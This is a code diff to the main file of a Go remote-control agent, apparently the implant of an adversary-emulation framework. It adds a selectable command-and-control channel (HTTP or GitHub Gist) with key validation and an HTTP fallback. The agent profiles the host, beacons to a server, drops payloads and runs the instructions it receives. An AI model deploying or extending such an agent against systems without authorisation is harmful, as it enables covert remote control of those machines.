@@ -11,13 +11,14 @@ import (
 	"reflect"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
-	"./contact"
-	"./execute"
-	"./util"
-	"./output"
-	"./privdetect"
+	"gocat/contact"
+	"gocat/execute"
+	"gocat/util"
+	"gocat/output"
+	"gocat/privdetect"
 )
 
 /*
@@ -29,6 +30,9 @@ var (
     defaultServer = "http://localhost:8888"
     defaultGroup = "my_group"
     defaultSleep = "60"
+    defaultC2 = "HTTP"
+    c2Name = ""
+    c2Key = ""
 )
 
 func runAgent(coms contact.Contact, profile map[string]interface{}) {
@@ -43,7 +47,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				fmt.Printf("[*] Running instruction %s\n", command["id"])
-				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string))
+				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
 				go coms.RunInstruction(command, profile, payloads)
 				util.Sleep(command["sleep"].(float64))
 			}
@@ -53,7 +57,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, group string, sleep int, executors []string, privilege string) map[string]interface{} {
+func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	rand.Seed(time.Now().UnixNano())
@@ -73,11 +77,18 @@ func buildProfile(server string, group string, sleep int, executors []string, pr
 	profile["ppid"] = strconv.Itoa(os.Getppid())
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
 	profile["privilege"] = privilege
+	profile["c2"] = strings.ToUpper(c2)
 	return profile
 }
 
 func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact {
-	coms, _ := contact.CommunicationChannels["API"]
+	coms, _ := contact.CommunicationChannels[profile["c2"].(string)]
+ 	if !validC2Configuration(coms, profile["c2"].(string)) && profile["c2"].(string) != defaultC2 {
+ 		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
+ 		coms, _ = contact.CommunicationChannels[defaultC2]
+ 		profile["c2"] = defaultC2
+ 	}
+
 	if coms.Ping(profile["server"].(string)) {
 		//go util.StartProxy(profile["server"].(string))
 		return coms
@@ -85,10 +96,17 @@ func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact 
 	proxy := util.FindProxy()
 	if len(proxy) == 0 {
 		return nil
-	} 
+	}
 	profile["server"] = proxy
 	return coms
 }
+
+func validC2Configuration(coms contact.Contact, c2 string) bool {
+	if strings.EqualFold(c2Name, c2) {
+		return coms.C2RequirementsMet(c2Key)
+	}
+	return false
+ }
 
 func main() {
 	var executors execute.ExecutorFlags
@@ -97,6 +115,7 @@ func main() {
 	group := flag.String("group", defaultGroup, "Attach a group to this agent")
 	sleep := flag.String("sleep", defaultSleep, "Initial sleep value for sandcat (integer in seconds)")
 	delay := flag.Int("delay", 0, "Delay starting this agent by n-seconds")
+	c2 := flag.String("c2", defaultC2, "C2 Channel for agent (HTTP and GIST supported)")
 	verbose := flag.Bool("v", false, "Enable verbose output")
 
 	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
@@ -111,8 +130,9 @@ func main() {
     output.VerbosePrint(fmt.Sprintf("sleep=%d", sleepInt))
     output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
     output.VerbosePrint(fmt.Sprintf("initial delay=%d", *delay))
+    output.VerbosePrint(fmt.Sprintf("c2 channel=%s", *c2))
 
-	profile := buildProfile(*server, *group, sleepInt, executors, privilege)
+	profile := buildProfile(*server, *group, sleepInt, executors, privilege, *c2)
 	util.Sleep(float64(*delay))
 
 	for {
